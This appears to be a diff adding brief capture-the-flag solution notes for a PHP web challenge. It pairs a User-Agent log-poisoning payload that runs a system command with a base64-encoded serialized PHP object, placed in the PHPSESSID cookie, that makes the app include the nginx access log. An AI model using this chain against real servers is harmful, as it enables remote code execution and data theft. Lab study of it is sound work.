@@ -1,0 +1,5 @@
+<?php system('cat /flag_CftWQ'); ?> => inject it in User-Agent header
+
+Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ== => O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}
+
+change phpsessid cookie
